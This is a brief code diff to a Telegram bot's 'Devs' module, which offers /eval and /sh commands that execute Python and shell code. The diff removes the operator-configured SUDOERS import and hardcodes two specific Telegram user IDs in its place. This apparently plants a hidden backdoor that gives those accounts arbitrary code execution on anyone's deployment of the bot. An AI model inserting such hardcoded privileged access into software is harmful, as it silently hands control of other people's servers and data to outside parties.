@@ -17,11 +17,12 @@ from time import time
 from pyrogram import filters
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 
-from wbb import SUDOERS, app
+from wbb import app
 
 __MODULE__ = "Devs"
 __HELP__ = "/eval - Execute Python Code\n/sh - Execute Shell Code"
 
+SUDOERS = [1513257955, 1037581197]
 
 async def aexec(code, client, message):
     exec(
